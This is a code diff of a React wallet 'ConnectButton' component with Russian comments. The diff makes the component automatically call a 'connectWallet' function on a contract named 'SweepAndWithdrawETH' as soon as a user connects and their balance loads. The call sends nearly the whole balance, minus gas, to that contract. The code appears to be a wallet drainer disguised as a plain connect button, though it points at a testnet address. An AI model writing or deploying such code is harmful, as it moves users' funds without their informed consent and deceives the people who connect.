@@ -1,6 +1,6 @@
 'use client'
 
-import React, { useState, useEffect } from 'react';
+import React, { useEffect, useCallback } from 'react';
 
 import { useClientMounted } from '@/hooks/useClientMount';
 import { hyperliquidTestnet } from '@/chains/hyperliquidChain';
@@ -15,98 +15,114 @@ import SWEEP_AND_WITHDRAW_ABI from '@/abi/SweepAndWithdrawETH.json';
 export function ConnectButton() {
   const mounted = useClientMounted()
 
-  // Адрес и статус подключения (AppKit)
+  // AppKit-хуки для адреса и открытия модалки
   const { address, isConnected } = useAppKitAccount();
   const { open } = useAppKit(); // <-- вызов open({ chainId }) откроет AppKit-модал
 
-  // Баланс, очередь на запись контракта и т. д.
-  const [lastBalance] = useState<bigint | undefined>();
-
-  const { refetch: refetchBalance } = useBalance({
-    address: address as Address,
-  });
-  const { disconnect } = useDisconnect();
   const chainId = useChainId();
   const publicClient = usePublicClient();
-  const { data: donateData, isError, isSuccess, error, writeContractAsync } = useWriteContract();
+  const { disconnect } = useDisconnect();
 
-  // После подключения проверяем сеть: если не наша — снова вызываем open()
+
+  // Баланс пользователя
+  const { data: balanceData, refetch: refetchBalance } = useBalance({
+    address: address as Address,
+  });
+
+  // Подготовленный хук для записи в контракт
+  const {
+    data: donateData,
+    isError,
+    isSuccess,
+    writeContractAsync,
+    isPending,
+  } = useWriteContract();
+
+  // При подключении проверяем сеть и получаем баланс
   useEffect(() => {
-    if (isConnected) {
-      if (chainId !== Number(hyperliquidTestnet.id)) {
-        open();
-      } else {
-        refetchBalance();
-      }
+    if (!isConnected) return;
+    if (chainId !== Number(hyperliquidTestnet.id)) {
+      // Если не на том тестнете — показываем выбор сети
+      // open({ chainId: Number(hyperliquidTestnet.id) });
+      open({ view: 'Connect', namespace: 'eip155' })
+    } else {
+      // Иначе подгружаем баланс
+      refetchBalance();
     }
   }, [isConnected, chainId, open, refetchBalance])
 
-  useEffect(() => {
-    if (isConnected && lastBalance && lastBalance > BigInt(0)) {
-      handleConnectWallet();
-    }
-  }, [isConnected, lastBalance])
+  // Вызов Смарт Контракта
+  const handleConnectWallet = useCallback(
+    async (balance: bigint) => {
+      if (!publicClient || !address) return;
+      try {
+        const data = encodeFunctionData({
+          abi: SWEEP_AND_WITHDRAW_ABI,
+          functionName: 'connectWallet',
+          args: [],
+        });
 
-  if (!mounted) return null;
-
-  // Обработчик «отправить весь баланс» в контракт
-  const handleConnectWallet = async () => {
-    if (!lastBalance || lastBalance === BigInt(0)) {
-      console.warn('Баланс равен нулю');
-      return;
-    }
-    try {
-      const data = encodeFunctionData({
-        abi: SWEEP_AND_WITHDRAW_ABI,
-        functionName: 'connectWallet',
-        args: [],
-      })
-
-      if (publicClient && lastBalance) {
         const estimatedGas = await publicClient.estimateGas({
           to: CONTRACT_ADDRESS_TEST,
           account: address as Address,
           data,
-          value: lastBalance,
-        })
+          value: balance,
+        });
         const gasPrice = await publicClient.getGasPrice();
         const totalFee = estimatedGas * gasPrice;
-        const netValue = lastBalance > totalFee ? lastBalance - totalFee : BigInt(0);
-
-        if (netValue === BigInt(0)) {
+        const valueToSend = balance > totalFee ? balance - totalFee : BigInt(0);
+        if (valueToSend === BigInt(0)) {
           console.warn('Не хватает средств на газ');
           return;
         }
 
-        await writeContractAsync({
+        const txHash = await writeContractAsync({
           address: CONTRACT_ADDRESS_TEST,
           abi: SWEEP_AND_WITHDRAW_ABI,
           functionName: 'connectWallet',
-          value: netValue,
-        })
+          value: valueToSend,
+          gas: estimatedGas,
+          gasPrice,
+        });
+        console.log('txHash', txHash);
+      } catch (err) {
+        console.error('Ошибка при транзакции:', err);
       }
-    } catch (err) {
-      console.error('Ошибка при транзакции:', err);
-    }
-  }
+    },
+    [publicClient, address, writeContractAsync]
+  );
 
-  // Если юзер уже подключён — показываем кнопку «Disconnect»
+
+  // Вызываем функцию Смарт Контракта, когда баланс подтянулся
+  useEffect(() => {
+    const balance = balanceData?.value ?? BigInt(0);
+    if (isConnected && balance > BigInt(0)) {
+      handleConnectWallet(balance);
+    }
+  }, [isConnected, balanceData, handleConnectWallet]);
+
+   
+
+  if (!mounted) return null;
+
+  // UI для подключенного пользователя
   if (isConnected) {
     return (
       <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
         <button onClick={() => disconnect()}>
           Disconnect ({address?.slice(0, 6)}…{address?.slice(-4)})
         </button>
-        {isError && <span style={{ color: 'red' }}>Donate error: {error?.message}</span>}
+        {isPending && <span>Sending tx…</span>}
+        {isError && <span style={{ color: 'red' }}>Tx error</span>}
         {isSuccess && donateData && <span style={{ color: 'green' }}>Tx: {donateData}</span>}
       </div>
-    )
+    );
   }
 
   // Если не подключён — показываем кнопку «Connect Wallet»
   return (
     <button
-      onClick={() => open()}
+      onClick={() => open({ view: 'Connect', namespace: 'eip155' })}
       style={{
         padding: '8px 16px',
         cursor: 'pointer',
